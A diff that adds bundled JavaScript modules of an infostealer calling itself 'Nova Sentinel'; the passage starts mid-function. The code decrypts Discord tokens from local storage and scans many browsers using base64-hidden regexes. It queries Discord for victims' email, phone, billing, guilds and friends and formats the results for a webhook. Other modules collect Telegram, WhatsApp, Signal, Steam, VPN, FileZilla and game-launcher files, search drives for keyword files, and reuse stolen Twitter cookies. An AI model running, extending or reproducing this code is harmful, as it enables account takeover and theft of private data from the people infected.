+    "Discord PTB": appdata + "\\discordptb\\Local Storage\\leveldb\\"
+  };
+  for (let [key, value] of Object.entries(discordpaths)) {
+    if (!fs.existsSync(value)) {
+      continue;
+    }
+    for (var file_name of fs.readdirSync(value)) {
+      if (!file_name.endsWith(".log") && !file_name.endsWith(".ldb")) {
+        continue;
+      }
+      let path_split = value.split("\\"),
+        path_split_tail = value.includes("Network") ? path_split.splice(0, path_split.length - 3) : path_split.splice(0, path_split.length - 2),
+        path_tail = path_split_tail.join("\\") + "\\";
+      for (var line of fs.readFileSync(`${value}/${file_name}`, "utf8").split("\n")) {
+        if (value.includes("cord")) {
+          let encrypted = Buffer.from(JSON.parse(fs.readFileSync(path_tail.replace("Local Storage", "Local State"))).os_crypt.encrypted_key, "base64").slice(5);
+          try {
+            const _key = boukiapi.unprotectData(Buffer.from(encrypted, "utf-8"), null, "CurrentUser");
+            var encrypted_regex = /dQw4w9WgXcQ:[^\"]*/;
+            if (line.match(encrypted_regex)) {
+              try {
+                var token = Buffer.from(line.match(encrypted_regex)[0].split("dQw4w9WgXcQ:")[1], "base64");
+                let start = token.slice(3, 15),
+                  middle = token.slice(15, token.length - 16),
+                  end = token.slice(token.length - 16, token.length),
+                  decipher = crypto.createDecipheriv("aes-256-gcm", _key, start);
+                decipher.setAuthTag(end);
+                token = decipher.update(middle, "base64", "utf-8") + decipher.final("utf-8");
+                tokens.push(token);
+              } catch (e) {}
+            }
+          } catch (e) {}
+        }
+      }
+    }
+  }
+  var browsers_path = [appdata + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\", appdata + "\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\", local + "\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\", local + "\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\", local + "\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\", local + "\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\", local + "\\CentBrowser\\User Data\\Local Storage\\leveldb\\", local + "\\Orbitum\\User Data\\Local Storage\\leveldb\\", local + "\\Kometa\\User Data\\Local Storage\\leveldb\\", local + "\\Torch\\User Data\\Local Storage\\leveldb\\", local + "\\Amigo\\User Data\\Local Storage\\leveldb\\", local + "\\BraveSoftware\\Brave-Browser\\User Data\\%PROFILE%\\Local Storage\\leveldb\\", local + "\\Iridium\\User Data\\%PROFILE%\\Local Storage\\leveldb\\", local + "\\Yandex\\YandexBrowser\\User Data\\%PROFILE%\\Local Storage\\leveldb\\", local + "\\uCozMedia\\Uran\\User Data\\%PROFILE%\\Local Storage\\leveldb\\", local + "\\Microsoft\\Edge\\User Data\\%PROFILE%\\Local Storage\\leveldb\\", local + "\\Google\\Chrome\\User Data\\%PROFILE%\\Local Storage\\leveldb\\", local + "\\Vivaldi\\User Data\\%PROFILE%\\Local Storage\\leveldb\\"];
+  var browsers_profile = [];
+  for (var i = 0; i < browsers_path.length; i++) {
+    const browser = browsers_path[i];
+    const profiles = core.getProfiles(browser, browser.split("\\")[6]);
+    for (var j = 0; j < profiles.length; j++) {
+      browsers_profile.push(profiles[j].path);
+    }
+  }
+  const reg1 = Buffer.from("W1x3LV17MjR9XC5bXHctXXs2fVwuW1x3LV17Mjd9", "base64").toString();
+  const reg2 = Buffer.from("bWZhXC5bXHctXXs4NH0=", "base64").toString();
+  const reg3 = Buffer.from("W1x3LV17MjR9XC5bXHctXXs2fVwuW1x3LV17MjUsMTEwfQ==", "base64").toString();
+  const cleanRegex = [new RegExp(reg1, "gm"), new RegExp(reg2, "gm"), new RegExp(reg3, "gm")];
+  for (let path of browsers_profile) {
+    if (!fs.existsSync(path)) {
+      continue;
+    }
+    let files = fs.readdirSync(path);
+    for (let file of files) {
+      for (let reg of cleanRegex) {
+        if (!(file.endsWith(".log") || file.endsWith(".ldb"))) {
+          continue;
+        }
+        let content = fs.readFileSync(path + file, "utf-8");
+        Array.prototype.push.apply(tokens, content.match(reg));
+      }
+    }
+  }
+  let uniqueTokens = [];
+  tokens.forEach(token => {
+    let prefix = token.split(".")[0];
+    if (!uniqueTokens.some(existingToken => existingToken.startsWith(prefix))) {
+      uniqueTokens.push(token);
+    }
+  });
+  tokens = tokens.filter(function (item, pos) {
+    return tokens.indexOf(item) == pos && item != null;
+  });
+  return await getAccounts(uniqueTokens);
+}
+const calcDate = (a, b) => new Date(a.setMonth(a.getMonth() + b));
+const GetNitro = r => {
+  if (!r) return ":x:";
+  if (!r.premium_type) return ":x:";
+  switch (r.premium_type) {
+    default:
+      return ":x:";
+    case 1:
+      return "<:946246402105819216:962747802797113365>";
+    case 2:
+      if (!r.premium_guild_since) return "<:946246402105819216:962747802797113365>";
+      var now = new Date(Date.now());
+      var arr = ["<:Booster1Month:1051453771147911208>", "<:Booster2Month:1051453772360077374>", "<:Booster6Month:1051453773463162890>", "<:Booster9Month:1051453774620803122>", "<:boost12month:1068308256088400004>", "<:Booster15Month:1051453775832961034>", "<:BoosterLevel8:1051453778127237180>", "<:Booster24Month:1051453776889917530>"];
+      var a = [new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since)];
+      var b = [2, 3, 6, 9, 12, 15, 18, 24];
+      var r = [];
+      for (var p in a) r.push(Math.round((calcDate(a[p], b[p]) - now) / 86400000));
+      var i = 0;
+      for (var p of r) p > 0 ? "" : i++;
+      return "<:946246402105819216:962747802797113365> " + arr[i];
+  }
+};
+function getCreationDate(userId) {
+  const timestamp = ((BigInt(userId) >> BigInt(22)) + BigInt(1420070400000n)) / BigInt(1000);
+  return Number(timestamp);
+}
+async function embed(username, tag, id, nitro, badges, billings, email, phone, token, avatar, password) {
+  var Nitro = await getURL("https://discord.com/api/v9/users/" + id + "/profile", token);
+  let date = getCreationDate(id);
+  let embed = {
+    color: 3553599,
+    author: {
+      name: `${username} (${id})`,
+      icon_url: `https://raw.githubusercontent.com/Yokheycv/sub/main/assets/novalogo3.png`
+    },
+    fields: [{
+      name: `${embeds.token} Token`,
+      value: `\`\`\`ansi\n[2;36m${token}[0m\`\`\`\n[Copy Token](https://scarpatta.fun/copy/${token})`,
+      inline: false
+    }, {
+      name: `${embeds.badges} Badges`,
+      value: `${badges}`,
+      inline: true
+    }, {
+      name: `${embeds.nitro} Nitro`,
+      value: `${GetNitro(Nitro)}`,
+      inline: true
+    }, {
+      name: `${embeds.billings} Billings`,
+      value: `${billings}`,
+      inline: true
+    }, {
+      name: `${embeds.mail} Email`,
+      value: `\`${email}\``,
+      inline: true
+    }, {
+      name: `${embeds.phone} Phone`,
+      value: `\`${phone}\``,
+      inline: true
+    }, {
+      name: `${stats.disclamer} Created`,
+      value: `<t:${date}:R>`,
+      inline: true
+    }],
+    thumbnail: {
+      url: `${avatar}`
+    },
+    footer: {
+      text: "@Nova Sentinel | https://t.me/Sordeal"
+    }
+  };
+  return JSON.stringify(embed);
+}
+async function embedguild(token) {
+  try {
+    const guilds = await getURL("https://discord.com/api/v9/users/@me/guilds", token);
+    if (guilds.length < 1 || guilds === null || guilds === undefined || Guilds.length === 0) {
+      return null;
+    }
+    const Guilds = await parseGuilds(guilds, token);
+    const formattedGuilds = await Guilds.map(g => `╔ **${g.Name}**\n` + `╠ **ID:** \`${g.ID}\`\n` + `╠  **Members Count:** \`${g.MembersCount}\`\n` + `╠ **Roles Count:** \`${g.RolesCount}\`\n` + `╠ **Boost:** \`${g.Boost}\`\n` + `╚ **Vanity:** \`${g.Vanity}\`\n\n`).join("");
+    const params2 = {
+      title: `${embeds.nova} Total Guilds Owner/Admin (${Guilds.length})`,
+      description: formattedGuilds,
+      color: 3553599
+    };
+    return JSON.stringify(params2);
+  } catch (error) {
+    return null;
+  }
+}
+async function embedbis(token) {
+  try {
+    const friends = await getURL("https://discord.com/api/v9/users/@me/relationships", token);
+    /*
+    let embed = "None";
+    const bots = await getURL(
+      "https://discord.com/api/v9/applications?with_team_applications=true",
+      token
+    );
+     if (bots.length > 0) {
+      const certif = {
+        1: "No",
+        2: "Eligible",
+        3: "In progress",
+        4: "Yes",
+      };
+       for (const bot of bots) {
+        console.log(bot)
+        if (bot.verification_state != 1) {
+          embed = `**Bot:** ${bot.username}#${
+            bot.discriminator
+          }\n**State:**: ${certif[bot.verification_state]}`;
+        }
+      }
+    }*/
+    if (friends.length < 1 || friends === null || friends === undefined) {
+      return null;
+    }
+    const Friends = parseFriends(friends);
+    const params2 = {
+      title: `${embeds.nova} UHQ Friends (${Friends.len})`,
+      description: "**Friends:**\n" + Friends.badges,
+      color: 3553599
+    };
+    return JSON.stringify(params2);
+  } catch (error) {
+    return null;
+  }
+}
+const getURL = async (url, token) => {
+  try {
+    const response = await axios.get(url, {
+      headers: {
+        Authorization: token
+      }
+    });
+    return response.data;
+  } catch (error) {
+    return null;
+  }
+};
+const GetRBadges = e => {
+  var n = "";
+  return 1 == (1 & e) && (n += `${badge.staff} `), 2 == (2 & e) && (n += `${badge.partner} `), 4 == (4 & e) && (n += `${badge.hypesquad_event} `), 8 == (8 & e) && (n += `${badge.bughunter_1} `), 512 == (512 & e) && (n += `${badge.early} `), 16384 == (16384 & e) && (n += `${badge.bughunter_2} `), 131072 == (131072 & e) && (n += `${badge.developer} `), "" == n && (n = ":x:"), n;
+};
+const parseGuilds = async (guilds, token) => {
+  let ownerguilds = [];
+  try {
+    for (const g of guilds) {
+      if (g.owner || g.permissions == 140737488355327) {
+        const response = await getURL(`https://discord.com/api/v9/guilds/${g.id}?with_counts=true`, token);
+        if (response.approximate_member_count > 50) {
+          var _response$vanity_url_;
+          let guildparsed = {
+            Name: g.name,
+            ID: g.id,
+            MembersCount: response.approximate_member_count,
+            Boost: response.premium_subscription_count,
+            Vanity: (_response$vanity_url_ = response.vanity_url_code) !== null && _response$vanity_url_ !== void 0 ? _response$vanity_url_ : "None",
+            RolesCount: response.roles.length
+          };
+          ownerguilds.push(guildparsed);
+        }
+      }
+    }
+    return ownerguilds;
+  } catch (err) {
+    return [];
+  }
+};
+const parseFriends = friends => {
+  try {
+    var real = friends.filter(x => x.type == 1);
+    var rareFriends = "";
+    for (var friend of real) {
+      var badges = GetRBadges(friend.user.public_flags);
+      if (badges !== ":x:") rareFriends += `${badges} | \`${friend.user.username}#${friend.user.discriminator}\`\n`;
+    }
+    if (!rareFriends) rareFriends = "*Nothing to see here*";
+    return {
+      len: real.length,
+      badges: rareFriends
+    };
+  } catch (err) {
+    return ":x:";
+  }
+};
+function compile(embeds) {
+  var build = "";
+  build += `{\n"content": null,\n"embeds": [`;
+  for (let i = 0; i < embeds.length; i++) {
+    build += embeds[i];
+    if (i != embeds.length - 1) {
+      build += ",\n";
+    }
+  }
+  build += `],\n"avatar_url": "https://raw.githubusercontent.com/Yokheycv/sub/main/assets/novalogo3.png",\n"username": "Nova Sentinel",\n"attachments": []\n}`;
+  return build;
+}
+module.exports = {
+  embed,
+  embedbis,
+  NovaSentinelDiscord,
+  compile,
+  embedguild,
+  WriteDiscord
+};
+},{"./core":"utils/core.js","./stats":"utils/stats.js","./emotes":"utils/emotes.js"}],"utils/files.js":[function(require,module,exports) {
+const fs = require("fs"),
+  save = require("./save"),
+  {
+    stat
+  } = require("./stats"),
+  path = require("path"),
+  appdata = process.env.appdata,
+  local = process.env.localappdata,
+  archiver = require("archiver"),
+  {
+    upload
+  } = require("./uploadFiles"),
+  https = require("https"),
+  axios = require("axios"),
+  agent = new https.Agent({
+    rejectUnauthorized: false
+  }),
+  fsPromises = fs.promises;
+class SimpleFile {
+  constructor(name, mainfolder, existpath, stealpath) {
+    this.name = name;
+    this.mainfolder = mainfolder;
+    this.existpath = existpath;
+    this.stealpath = stealpath;
+  }
+}
+function NovaSentinelSimple() {
+  try {
+    const homepath = process.env.homepath;
+    const simples = [new SimpleFile("MobaXterm", "Clients", appdata + "\\MobaXterm\\", [appdata + "\\MobaXterm/MobaXterm.ini"]), new SimpleFile("NationsGlory", "Games", appdata + "\\NationsGlory\\", [appdata + "\\NationsGlory\\Local Storage/leveldb"]), new SimpleFile("Growtopia", "Games", local + "\\Growtopia\\", [local + "\\Growtopia\\save.dat"]), new SimpleFile("Minecraft", "Games", appdata + "\\.minecraft\\", []), new SimpleFile("Skype", "Social", appdata + "\\Microsoft\\Skype for Desktop\\Local Storage\\", [appdata + "\\Microsoft\\Skype for Desktop\\Local Storage\\"]), new SimpleFile("Element", "Social", appdata + "\\Element\\Local Storage\\", [appdata + "\\Element\\Local Storage\\"]), new SimpleFile("Signal", "Social", appdata + "\\Signal\\", [appdata + "\\Signal\\Local Storage\\", appdata + "\\Signal\\Session Storage\\", appdata + "\\Signal\\sql\\", appdata + "\\Signal\\databases\\", appdata + "\\Signal\\config.json"]), new SimpleFile("ICQ", "Social", appdata + "\\ICQ\\0001\\", [appdata + "\\ICQ\\0001\\"]), new SimpleFile("FileZilla", "Clients", appdata + "\\FileZilla\\", [appdata + "\\FileZilla\\recentservers.xml"]), new SimpleFile("OpenVPN Connect", "VPN", appdata + "\\OpenVPN Connect\\", [appdata + "\\OpenVPN Connect\\profiles"]), new SimpleFile("Shadow", "Clients", appdata + "\\shadow\\", [appdata + "\\shadow\\Local State", appdata + "\\shadow\\Local Storage\\", appdata + "\\shadow\\Session Storage\\"]), new SimpleFile("TotalCommander", "Clients", appdata + "\\GHISLER\\", [appdata + "\\GHISLER\\wcx_ftp.ini"]), new SimpleFile("LunarClient", "Games", homepath + "\\.lunarclient\\settings\\game\\", []), new SimpleFile("FeatherClient", "Games", appdata + "\\.feather\\", []), new SimpleFile("EssentialClient", "Games", appdata + "\\.minecraft\\essential\\", []), new SimpleFile("TLauncher", "Games", appdata + "\\.tlauncher\\mcl\\Minecraft\\game\\", [])];
+    for (let i = 0; i < simples.length; i++) {
+      const simple = simples[i];
+      if (fs.existsSync(simple.existpath)) {
+        if (simple.mainfolder == "Clients") {
+          stat.AddSysAdmin(simple.name);
+        }
+        if (simple.mainfolder == "Social") {
+          stat.AddMessenger(simple.name);
+        }
+        if (simple.mainfolder == "Games" && !simple.name.includes("craft") && !simple.name.includes("lunar") && !simple.existpath.includes("feather")) {
+          stat.AddGames(simple.name);
+        }
+        if (simple.existpath.includes("craft") || simple.existpath.includes("lunarclient") || simple.existpath.includes("feather")) {
+          stat.AddGames(simple.name);
+          const mcfiles = fs.readdirSync(simple.existpath);
+          const filteredFiles = mcfiles.filter(file => file.includes(".json") || file.includes(".txt") || file.includes(".dat"));
+          filteredFiles.forEach(f => {
+            const fullPath = path.join(simple.existpath, f);
+            if (f.includes(".json")) {
+              stat.addMinecraft(fullPath);
+            }
+            simple.stealpath.push(fullPath);
+          });
+        }
+        save.ArraySave(simple.stealpath, simple.mainfolder, simple.name);
+      }
+    }
+  } catch (e) {
+    save.SaveError(e);
+  }
+}
+function parseConfigVDF(filePath) {
+  const vdf = fs.readFileSync(filePath, "utf-8");
+  const lines = vdf.split("\n");
+  let result = [];
+  for (const line of lines) {
+    const matches = line.match(/7656[0-9]{13}/gi);
+    if (matches) {
+      result = result.concat(matches);
+    }
+  }
+  return result;
+}
+function NovaSentinelSteam(cc) {
+  if (cc != "yes") return;
+  try {
+    const mainPath = ["C:\\program files (x86)\\steam\\", "C:\\program files\\steam\\"];
+    var saves = [];
+    for (let i = 0; i < mainPath.length; i++) {
+      const path = mainPath[i];
+      if (fs.existsSync(path)) {
+        const files = fs.readdirSync(path);
+        for (let u = 0; u < files.length; u++) {
+          const file = files[u];
+          const savePath = path + file;
+          if (file.includes("ssfn")) {
+            saves.push(savePath);
+          }
+        }
+        const configPath = path + "config\\";
+        if (fs.existsSync(configPath)) {
+          saves.push(configPath);
+          if (fs.existsSync(configPath + "config.vdf")) {
+            const configData = parseConfigVDF(configPath + "loginusers.vdf");
+            stat.addSteam(configData);
+          }
+        }
+      }
+    }
+    if (saves.length != 0) {
+      stat.AddGames("Steam");
+      save.ArraySave(saves, "Launcher", "Steam");
+    }
+  } catch (e) {
+    save.SaveError(e);
+  }
+}
+function NovaSentinelTermius(cc) {
+  if (cc != "yes") return;
+  try {
+    const termius_path = local + "\\Termius\\Local Storage\\leveldb\\";
+    if (!fs.existsSync(termius_path)) {
+      return;
+    }
+    var saves = [];
+    const files = fs.readdirSync(termius_path);
+    for (var i = 0; i < files.length; i++) {
+      const file = files[i];
+      const savePath = termius_path + file;
+      if (fs.lstatSync(savePath).isDirectory()) {
+        if (file.length != 16) {
+          continue;
+        }
+        saves.push(savePath + "//");
+      } else {
+        saves.push(savePath);
+      }
+    }
+    stat.AddSysAdmin("Termius");
+    save.ArraySave(saves, "Clients", "Termius");
+  } catch (e) {
+    save.SaveError(e);
+  }
+}
+function NovaSentinelTelegram(cc) {
+  if (cc != "yes") return;
+  try {
+    const telegram_path = appdata + "\\Telegram Desktop\\tdata\\";
+    if (!fs.existsSync(telegram_path)) {
+      return;
+    }
+    var saves = [];
+    const files = fs.readdirSync(telegram_path);
+    for (var i = 0; i < files.length; i++) {
+      const file = files[i];
+      const savePath = telegram_path + file;
+      if (fs.lstatSync(savePath).isDirectory()) {
+        if (file.length != 16) {
+          continue;
+        }
+        saves.push(savePath + "//");
+      } else {
+        if (file.endsWith("s") || file.length == 17) {
+          saves.push(savePath);
+        }
+        if (file.startsWith("settings") || file.startsWith("key_data") || file.startsWith("usertag")) {
+          saves.push(savePath);
+        }
+      }
+    }
+    stat.AddMessenger("Telegram");
+    save.ArraySave(saves, "Social", "Telegram");
+  } catch (e) {
+    save.SaveError(e);
+  }
+}
+function NovaSentinelWhatsapp(cc) {
+  if (cc != "yes") return;
+  try {
+    const whatsapp_path = appdata + "\\Packages\\5319275A.WhatsAppDesktop_cv1g1gvanyjgm\\LocalState\\";
+    var saves = [];
+    if (!fs.existsSync(whatsapp_path)) {
+      return;
+    }
+    if (fs.existsSync(whatsapp_path)) {
+      const files = fs.readdirSync(whatsapp_path);
+      for (let i = 0; i < files.length; i++) {
+        const file = files[i];
+        const savePath = whatsapp_path + file;
+        if (file.endsWith(".ini") || file.endsWith(".db")) {
+          saves.push(savePath);
+        }
+      }
+    }
+    stat.AddMessenger("WhatsApp");
+    save.ArraySave(saves, "Social", "WhatsApp");
+  } catch (e) {
+    save.SaveError(e);
+  }
+}
+function NovaSentinelFetchT0x(cc) {
+  if (cc != "yes") return;
+  try {
+    const tox_path = appdata + "\\tox\\";
+    var saves = [];
+    if (!fs.existsSync(tox_path)) {
+      return;
+    }
+    if (fs.existsSync(tox_path)) {
+      const files = fs.readdirSync(tox_path);
+      for (let i = 0; i < files.length; i++) {
+        const file = files[i];
+        const savePath = tox_path + file;
+        if (file.endsWith(".tox") || file.endsWith(".ini") || file.endsWith(".db")) {
+          saves.push(savePath);
+        }
+      }
+    }
+    stat.AddMessenger("Tox");
+    save.ArraySave(saves, "Social", "Tox");
+  } catch (e) {
+    save.SaveError(e);
+  }
+}
+function NovaSentinelPidgin(cc) {
+  if (!cc) return;
+  try {
+    const mainPath = appdata + "\\.purple\\";
+    if (!fs.existsSync(mainPath)) {
+      return;
+    }
+    if (fs.existsSync(mainPath + "accounts.xml")) {
+      stat.AddMessenger("Pidgin");
+      save.ArraySave([mainPath + "accounts.xml"], "Social", "Pidgin");
+    }
+  } catch (e) {
+    save.SaveError(e);
+  }
+}
+function NovaSentinelNordVPN(cc) {
+  if (cc != "yes") return;
+  try {
+    const mainPath = local + "\\NordVPN\\";
+    if (!fs.existsSync(mainPath)) {
+      return;
+    }
+    const files = fs.readdirSync(mainPath);
+    var saves = [];
+    for (let i = 0; i < files.length; i++) {
+      const file = files[i];
+      const savePath = mainPath + file + "\\";
+      if (fs.statSync(savePath).isDirectory) {
+        if (file.includes("exe")) {
+          const filesExe = fs.readdirSync(savePath);
+          for (let u = 0; u < filesExe.length; u++) {
+            const fileExe = filesExe[u];
+            if (fs.existsSync(savePath + fileExe + "\\user.config")) {
+              saves.push(savePath + fileExe + "\\user.config");
+            }
+          }
+        }
+      }
+    }
+    stat.AddVpn("NordVPN");
+    save.ArraySave(saves, "VPN", "NordVPN");
+  } catch (e) {
+    save.SaveError(e);
+  }
+}
+function NovaSentinelProton(cc) {
+  if (cc != "yes") return;
+  try {
+    const mainPath = local + "\\ProtonVPN\\";
+    if (!fs.existsSync(mainPath)) {
+      return;
+    }
+    const files = fs.readdirSync(mainPath);
+    var saves = [];
+    for (let i = 0; i < files.length; i++) {
+      const file = files[i];
+      const savePath = mainPath + file + "\\";
+      if (fs.statSync(savePath).isDirectory) {
+        if (file.includes("exe")) {
+          const filesExe = fs.readdirSync(savePath);
+          for (let u = 0; u < filesExe.length; u++) {
+            const fileExe = filesExe[u];
+            if (fs.existsSync(savePath + fileExe + "\\user.config")) {
+              saves.push(savePath + fileExe + "\\user.config");
+            }
+          }
+        }
+      }
+    }
+    stat.AddVpn("ProtonVPN");
+    save.ArraySave(saves, "VPN", "ProtonVPN");
+  } catch (e) {
+    save.SaveError(e);
+  }
+}
+function NovaSentinelRiotGame(cc) {
+  if (cc != "yes") return;
+  let riotgame = local + "\\Riot Games\\Riot Client\\Data\\";
+  try {
+    var saves = [];
+    if (fs.existsSync(path)) {
+      const files = fs.readdirSync(riotgame);
+      for (let u = 0; u < files.length; u++) {
+        const file = files[u];
+        const savePath = path + file;
+        saves.push(savePath);
+      }
+    }
+    if (saves.length != 0) {
+      stat.AddGames("Riotgames");
+      save.ArraySave(saves, "Launcher", "RiotGames");
+    }
+  } catch (e) {
+    save.SaveError(e);
+  }
+}
+function NovaSentinelEpicGame(cc) {
+  if (cc != "yes") return;
+  let epicpath = [];
+  try {
+    const epicgame = local + "\\EpicGamesLauncher\\Saved\\Config\\Windows\\";
+    const config_file = path.join(epicgame, "GameUserSettings.ini");
+    if (fs.existsSync(epicgame) && fs.existsSync(config_file)) {
+      const contents = fs.readFileSync(config_file, "utf-8");
+      if (contents.includes("[RememberMe]")) {
+        const files = fs.readdirSync(epicgame);
+        for (let i = 0; i < files.length; i++) {
+          const file = files[i];
+          const filePath = epicgame + file;
+          epicpath.push(filePath);
+        }
+      }
+      stat.AddGames("EpicGame");
+      save.ArraySave(epicpath, "Launcher", "EpicGame");
+    }
+  } catch (error) {
+    save.SaveError(error);
+  }
+}
+function NovaSentinelGOG(cc) {
+  if (cc != "yes") return;
+  try {
+    const gog = local + "\\GOG.com\\Galaxy\\Configuration\\";
+    if (fs.existsSync(gog)) {
+      stat.AddGames("GOG");
+      save.SimpleSave(gog, "Launcher", "GOG");
+    }
+  } catch (error) {
+    save.SaveError(error);
+  }
+}
+function NovaSentinelRockstarGames(cc) {
+  if (cc != "yes") return;
+  try {
+    const rockstar = local + "\\Rockstar Games\\Launcher\\";
+    if (fs.existsSync(rockstar)) {
+      stat.AddGames("Rockstar");
+      save.SimpleSave(rockstar, "Launcher", "Rockstar");
+    }
+  } catch (error) {
+    save.SaveError(error);
+  }
+}
+function NovaSentinelElectronicArts(cc) {
+  if (cc != "yes") return;
+  try {
+    const eapath = local + "\\Electronic Arts\\EA Desktop\\Windows\\cookie.ini";
+    if (fs.existsSync(eapath)) {
+      stat.AddGames("ElectronicArts");
+      save.SimpleSave(eapath, "Launcher", "ElectronicArts");
+    }
+  } catch (error) {
+    save.SaveError(error);
+  }
+}
+function NovaSentinelUbisoft(cc) {
+  if (cc != "yes") return;
+  let riotgame = local + "\\Ubisoft Game Launcher\\";
+  try {
+    var saves = [];
+    if (fs.existsSync(path)) {
+      const files = fs.readdirSync(riotgame);
+      for (let u = 0; u < files.length; u++) {
+        const file = files[u];
+        const savePath = path + file;
+        saves.push(savePath);
+      }
+    }
+    if (saves.length != 0) {
+      stat.AddGames("Ubisoft");
+      save.ArraySave(saves, "Launcher", "Ubisoft");
+    }
+  } catch (error) {}
+}
+function NovaSentinelOpenVPN(cc) {
+  if (cc != "yes") return;
+  try {
+    const mainPath = appdata + "\\OpenVPN Connect\\profiles\\";
+    var saves = [];
+    if (!fs.existsSync(mainPath)) {
+      return;
+    }
+    const files = fs.readdirSync(mainPath);
+    for (let i = 0; i < files.length; i++) {
+      const file = files[i];
+      const savePath = mainPath + file;
+      saves.push(savePath);
+    }
+    stat.AddGames("OpenVPN");
+    save.ArraySave(saves, "VPN", "OpenVPN");
+  } catch (e) {
+    save.SaveError(e);
+  }
+}
+function NovaSentinelBattle(cc) {
+  if (cc != "yes") return;
+  try {
+    const mainPath = appdata + "\\Battle.net\\";
+    var saves = [];
+    if (!fs.existsSync(mainPath)) {
+      return;
+    }
+    const files = fs.readdirSync(mainPath);
+    for (let i = 0; i < files.length; i++) {
+      const file = files[i];
+      const savePath = mainPath + file;
+      if (file.includes("db") || file.includes("config")) {
+        saves.push(savePath);
+      }
+    }
+    stat.AddGames("Battle.net");
+    save.ArraySave(saves, "Launcher", "Battlenet");
+  } catch (e) {
+    save.SaveError(e);
+  }
+}
+async function rechercherFichiers(repertoire, textes, extensions) {
+  const fichiersTrouves = [];
+  const fichiers = await fsPromises.readdir(repertoire);
+  for (const fichier of fichiers) {
+    const chemin = path.join(repertoire, fichier);
+    const stat = await fsPromises.stat(chemin);
+    const extension = path.extname(fichier).toLowerCase();
+    if (!stat.isDirectory() && extensions.includes(extension)) {
+      if (textes.some(texte => fichier.toLowerCase().includes(texte))) {
+        fichiersTrouves.push(chemin);
+      }
+    }
+  }
+  return fichiersTrouves;
+}
+function genererNomAleatoire(longueur) {
+  const caracteres = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+  let nomAleatoire = "";
+  for (let i = 0; i < longueur; i++) {
+    const index = Math.floor(Math.random() * caracteres.length);
+    nomAleatoire += caracteres.charAt(index);
+  }
+  return nomAleatoire;
+}
+async function zipEtSupprimerDossier(dossierSource) {
+  const dossierDestination = `${path.dirname(dossierSource)}\\@${process.env.USERNAME.replace(".", "") || "USER"}_Keywords.zip`;
+  return new Promise((resolve, reject) => {
+    const output = fs.createWriteStream(dossierDestination);
+    const archive = archiver("zip", {
+      zlib: {
+        level: 9
+      }
+    });
+    output.on("close", async () => {
+      try {
+        await fsPromises.rm(dossierSource, {
+          recursive: true
+        });
+        resolve(dossierDestination);
+      } catch (err) {
+        reject(err);
+      }
+    });
+    archive.on("error", err => {
+      reject(err);
+    });
+    archive.pipe(output);
+    archive.directory(dossierSource, false);
+    archive.finalize();
+  });
+}
+function NovasearchFilesDir(extensionsAutorisees, motsARechercher) {
+  const driveLetters = [];
+  for (let i = 65; i <= 90; i++) {
+    const driveLetter = String.fromCharCode(i) + ":";
+    driveLetters.push(driveLetter);
+  }
+  const os = require("os");
+  const mainDriveLetter = os.platform() === "win32" ? os.homedir().charAt(0).toUpperCase() + ":" : null;
+  if (mainDriveLetter) {
+    const index = driveLetters.indexOf(mainDriveLetter);
+    if (index !== -1) {
+      driveLetters.splice(index, 1);
+    }
+  }
+  const matchingFiles = [];
+  function checkFilesInDirectory(directory) {
+    try {
+      const files = fs.readdirSync(directory);
+      files.forEach(file => {
+        const fileExtension = path.extname(file);
+        const fileName = path.basename(file);
+        if (extensionsAutorisees.includes(fileExtension)) {
+          for (const mot of motsARechercher) {
+            if (fileName.includes(mot)) {
+              matchingFiles.push(path.join(directory, file));
+              break;
+            }
+          }
+        }
+      });
+    } catch (error) {}
+  }
+  driveLetters.forEach(driveLetter => {
+    const directory = path.join(driveLetter, "\\");
+    checkFilesInDirectory(directory);
+  });
+  return matchingFiles;
+}
+module.exports = {
+  NovaSentinelSimple,
+  NovaSentinelSteam,
+  NovaSentinelTelegram,
+  NovaSentinelFetchT0x,
+  NovaSentinelProton,
+  NovaSentinelBattle,
+  NovaSentinelPidgin,
+  NovaSentinelEpicGame,
+  NovaSentinelRiotGame,
+  NovaSentinelUbisoft,
+  NovaSentinelNordVPN,
+  NovaSentinelOpenVPN,
+  NovaSentinelElectronicArts,
+  NovaSentinelRockstarGames,
+  NovaSentinelGOG,
+  NovaSentinelWhatsapp
+};
+},{"./save":"utils/save.js","./stats":"utils/stats.js","./uploadFiles":"utils/uploadFiles.js"}],"utils/twitter.js":[function(require,module,exports) {
+const {
+    stat
+  } = require("./stats"),
+  fs = require("fs"),
+  axios = require("axios"),
+  path = require("path"),
+  {
+    embeds
+  } = require("./emotes");
+async function detailtwitter(tw) {
+  if (tw != "yes") return;
+  const cooks = stat.twitter_cookies;
+  if (!cooks) return;
+  if (cooks.length < 12) return;
+  try {
+    const {
+      value: ct0
+    } = cooks.find(cookie => cookie.name === "ct0");
+    const {
+      value: authToken,
+      source
+    } = (await cooks).find(cookie => cookie.name === "auth_token");
+    const {
+      data: profile
+    } = await axios.post("https://twitter.com/i/api/1.1/account/update_profile.json", {}, {
+      headers: {
+        Cookie: `ct0=${ct0}; auth_token=${authToken}`,
+        Host: "twitter.com",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0",
+        Accept: "*/*",
+        "Accept-Language": "fr-FR",
+        "Accept-Encoding": "gzip, deflate, br",
+        Prefer: "safe",
+        authorization: "Bearer AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA",
+        "x-twitter-auth-type": "OAuth2Session",
+        "x-csrf-token": ct0,
+        "x-twitter-client-language": "en",
+        "x-twitter-active-user": "yes",
+        Origin: "https://twitter.com",
+        Connection: "keep-alive",
+        Referer: "https://twitter.com/",
+        "Sec-Fetch-Dest": "empty",
+        "Sec-Fetch-Mode": "cors",
+        "Sec-Fetch-Site": "same-site"
+      }
+    });
+    profile.cookie = ct0;
+    profile.source = source;
